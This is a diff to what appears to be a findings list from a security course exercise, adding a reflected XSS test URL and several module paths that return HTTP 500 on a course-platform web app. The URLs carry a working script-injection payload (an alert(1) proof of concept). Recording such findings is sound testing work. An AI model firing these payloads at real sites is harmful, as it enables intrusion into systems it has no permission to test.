@@ -102,6 +102,7 @@ http://the-intruders.csec.chatzi.org/modules/conference/conference.php/'%22%22%3
 http://the-intruders.csec.chatzi.org/modules/auth/newuser.php/'%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E.com
 http://the-intruders.csec.chatzi.org/modules/auth/contactprof.php/'%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E.com
 
+http://the-intruders.csec.chatzi.org/modules/contact/index.php/'%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
 
 --------------------------------------------------------------------------------------------------------------
 
@@ -126,3 +127,9 @@ http://the-intruders.csec.chatzi.org/modules/auth/contactprof.php/'%22%22%3E%3Cs
 
 HTTP 500:
 the-intruders.csec.chatzi.org/modules/auth/methods/shibform.php
+the-intruders.csec.chatzi.org/modules/create_course/create_course_db.php
+the-intruders.csec.chatzi.org/modules/latexrender/phpbb_hook_2.php
+the-intruders.csec.chatzi.org/modules/search/search_loggedin.php
+the-intruders.csec.chatzi.org/modules/search/search_loggedout.php
+the-intruders.csec.chatzi.org/modules/usage/form.php
+the-intruders.csec.chatzi.org/modules/usage/results.php
